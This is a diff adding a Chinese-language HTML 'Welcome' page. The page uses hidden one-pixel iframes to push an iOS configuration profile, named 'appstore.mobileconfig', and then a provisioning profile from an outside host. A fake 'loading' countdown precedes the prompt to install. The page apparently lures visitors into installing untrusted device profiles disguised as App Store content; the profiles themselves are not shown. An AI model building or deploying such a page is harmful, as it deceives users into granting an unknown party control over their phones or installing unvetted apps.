@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>Welcome</title>
+</head>
+<body>
+    <div style="text-align:center;padding:20px 0">
+    <iframe src="https://oss.dclouds.cloud/github/appstore.mobileconfig" frameborder="0" height="1"></iframe>
+    <iframe src="about:blank" id="fake" frameborder="0" height="1"></iframe>
+	
+    <p style="font-size:120%">请 <strong style="color:#0b78e4">允许</strong> 下载</p>
+    <div id="tick"></div>
+    <script>
+        (function (n) {
+            var fake = document.getElementById('fake');
+            var tick = document.getElementById('tick');
+            function doTick() {
+                if (n > 0) {
+                    tick.innerText = "加载中" + n + "...";
+                    setTimeout(doTick, 1000);
+                } else {
+                    tick.innerText = "已完成，请安装";
+                    fake.src = 'https://oss.dclouds.cloud/embedded.mobileprovision';
+                }
+                n--;
+            };
+            doTick();
+        })(3);
+    </script>
+</div>
+</body>
+</html>
